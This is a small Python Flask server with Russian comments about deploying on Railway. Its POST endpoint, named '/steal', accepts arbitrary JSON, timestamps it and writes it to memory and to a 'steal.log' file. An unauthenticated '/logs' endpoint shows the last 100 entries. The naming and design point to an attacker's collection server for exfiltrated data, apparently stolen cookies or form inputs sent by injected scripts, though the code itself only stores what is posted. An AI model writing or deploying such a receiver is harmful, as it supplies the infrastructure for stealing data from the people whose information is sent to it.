from flask import Flask, request, jsonify
import json
import os
from datetime import datetime

app = Flask(__name__)

# Простое хранилище в памяти (при перезапуске теряется)
# Для продакшена лучше использовать базу данных (например, PostgreSQL)
storage = []

@app.route('/steal', methods=['POST'])
def steal():
    try:
        data = request.get_json()
        if data is None:
            return 'Invalid JSON', 400
        # Добавляем метку времени
        data['received_at'] = datetime.utcnow().isoformat()
        storage.append(data)
        # Сохраняем в файл (на Railway файловая система эфемерна, но для логов ок)
        with open('steal.log', 'a', encoding='utf-8') as f:
            f.write(json.dumps(data, ensure_ascii=False) + '\n')
        print(f"Received: {data}")  # будет видно в логах Railway
        return 'OK', 200
    except Exception as e:
        print(f"Error: {e}")
        return 'Error', 500

@app.route('/logs', methods=['GET'])
def get_logs():
    # Простой просмотр последних 100 записей (для отладки)
    return jsonify(storage[-100:])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
